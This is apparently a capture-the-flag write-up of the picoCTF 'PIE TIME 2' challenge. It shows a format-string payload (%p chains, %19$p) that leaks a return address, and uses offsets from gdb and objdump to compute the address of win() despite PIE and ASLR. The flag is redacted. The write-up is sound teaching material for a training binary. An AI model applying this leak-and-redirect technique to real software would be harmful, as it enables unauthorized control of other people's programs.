# PIE TIME 2 #
 
## Overview ##

200 points

Category: [Binary Exploitation](../)

Tags: `#binaryexploitation #PIE #formatstring #infoleak #ASLR`

## Description ##

Can you try to get the flag? I'm not revealing anything anymore!!

## Approach ##

Checking the binary securities to confirm as we expect given the name of the challenge, the binary is indeed a Position Independent Executable (PIE), as per the previous [PIE TIME](../PIE%20TIME/PIE%20TIME.md) challenge.

    $ checksec vuln
    [*] '/home/user/picoCTF/PIE-TIME-2/vuln'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled

Inspecting the provided `vuln.c` source file, we see `main()` calls the function `call_functions()`.

    int main() {
      signal(SIGSEGV, segfault_handler);
      setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

      call_functions();
      return 0;
    }

Where `call_functions()` again requests an address as input to call as a function pointer.

    void call_functions() {
      char buffer[64];
      printf("Enter your name:");
      fgets(buffer, 64, stdin);
      printf(buffer);

      unsigned long val;
      printf(" enter the address to jump to, ex => 0x12345: ");
      scanf("%lx", &val);

      void (*foo)(void) = (void (*)())val;
      foo();
    }

We cannot overflow `buffer` as the `fgets()` is using the correct value for its `size` parameter. However our user input within `buffer` is printed directly via the `printf(buffer)` call, and not as parameter within a format string, hence is vulnerable to a format string exploit.

The format string vulnerability will be used to leak information from the stack, in this case our return address from `call_functions()` back to `main()`.

So our plan of attack is;

- determine what the value of the return address is
- use a format string attack to leak contents of the stack in an attempt to locate this return address
- calculate the relative offset from this return address to the `win()`, such that we can adjust the leaked value of the return address by this relative offset.

Running `vuln` in `gdb` to assist with locating the return address within the format string based infoleak. Remembering that Address Space Layout Randomisation (ASLR) is disabled when processes are being debugged in `gdb`.

    $ gdb ./vuln
    $ br call_functions
    $ r

When execution breaks at the entry of `call_functions()` we can inspect the stack and see our return address is `0x00555555555441`.

    ───────────────────────────────────────────────────────────────────── stack ────
    0x007fffffffdfb0│+0x0000: 0x007fffffffdfc0  →  0x0000000000000001  ← $rsp, $rbp
    0x007fffffffdfb8│+0x0008: 0x00555555555441  →  <main+65> mov eax, 0x0
    0x007fffffffdfc0│+0x0010: 0x0000000000000001
    0x007fffffffdfc8│+0x0018: 0x007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
    0x007fffffffdfd0│+0x0020: 0x0000000000000000
    0x007fffffffdfd8│+0x0028: 0x00555555555400  →  <main+0> endbr64 
    0x007fffffffdfe0│+0x0030: 0x00000001ffffe0c0
    0x007fffffffdfe8│+0x0038: 0x007fffffffe0d8  →  0x007fffffffe408  →  "/home/user/picoCTF/PIE-TIME-2/vuln"

Now continuing execution, we are prompted for our input, at which point we cant to use a typical format string attack to leak contents of the stack, by requesting a series of pointers (`%p`) be printed via the `printf()` call. Given there are no arguments supplied with this format string, `printf()` will print values from the stack at where the arguments should be been located.

The `%p.` input string was created using python's CLI for convenience in preparation:

    $ python3 -c 'print("%p."*20)'
    %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.

The periods in the string just help to isolate individual values and assist with readability, but not a requirement.

    $ c
    Continuing.
    Enter your name:%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
    0x5555555592a1.0xfbad2288.0x5555555592dd.(nil).0x5555555592a0.(nil).0x7ffff7e1b780.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa2e70252e.0x7fffffffe108.0xdca80e800e918600.0x7fffffffdff0.0x555555555441.0x1.

We find our return address of `0x00555555555441` at the 19'th value displayed in the output.

Remembering when it comes to the actual attack on the challenge server a short hand format string to print only the 19'th value is: `%19$p`.

Using `objdump` I found the offsets of the return address within `main()` from `call_functions()` and `win()`. Remembering as the code segment is position independent, we are only interested in the relative offset not absolute values. Note that this could have been done whilst still in `gdb` rather than using `objdump`, but I did this step first when solving the challenge.

    $ objdump -M intel -d vuln > objdump_vuln.txt

        0000000000001400 <main>:
            1400: f3 0f 1e fa           endbr64 
            1404: 55                    push   rbp
            1405: 48 89 e5              mov    rbp,rsp
            1408: 48 8d 35 9a fe ff ff  lea    rsi,[rip+0xfffffffffffffe9a]        # 12a9 <segfault_handler>
            140f: bf 0b 00 00 00        mov    edi,0xb
            1414: e8 57 fd ff ff        call   1170 <signal@plt>
            1419: 48 8b 05 f0 2b 00 00  mov    rax,QWORD PTR [rip+0x2bf0]        # 4010 <stdout@GLIBC_2.2.5>
            1420: b9 00 00 00 00        mov    ecx,0x0
            1425: ba 02 00 00 00        mov    edx,0x2
            142a: be 00 00 00 00        mov    esi,0x0
            142f: 48 89 c7              mov    rdi,rax
            1432: e8 49 fd ff ff        call   1180 <setvbuf@plt>
            1437: b8 00 00 00 00        mov    eax,0x0
            143c: e8 86 fe ff ff        call   12c7 <call_functions>
        ->  1441: b8 00 00 00 00        mov    eax,0x0
            1446: 5d                    pop    rbp
            1447: c3                    ret    

and,

        000000000000136a <win>:
            136a: f3 0f 1e fa           endbr64 
            136e: 55                    push   rbp
            136f: 48 89 e5              mov    rbp,rsp
            1372: 48 83 ec 10           sub    rsp,0x10
            ...

Return address offset within `main()` is `0x1441` and `win()` address offset is `0x136a`. Therefore the relative offset from the return address to `win()` is:

    `0x1441 - 0x136a = 0xD7`

So we now have everything we need to run the attack on the challenge server.

## Solution ##

Running the attack on the challenge server:

    $ nc rescued-float.picoctf.net 65060
    Enter your name:%19$p
    0x5bd617cbc441
     enter the address to jump to, ex => 0x12345: 0x5BD617CBC36A
    You won!
    picoCTF{...........redacted.............}

The return address back to  `main()` for this invocation was `0x5bd617cbc441`.

Therefore `0x5bd617cbc441 - 0xd7 = 0x5BD617CBC36A`, inputting this calculated address of `win()` dropped us the flag.

Where the actual flag value has been redacted for the purposes of this write up.
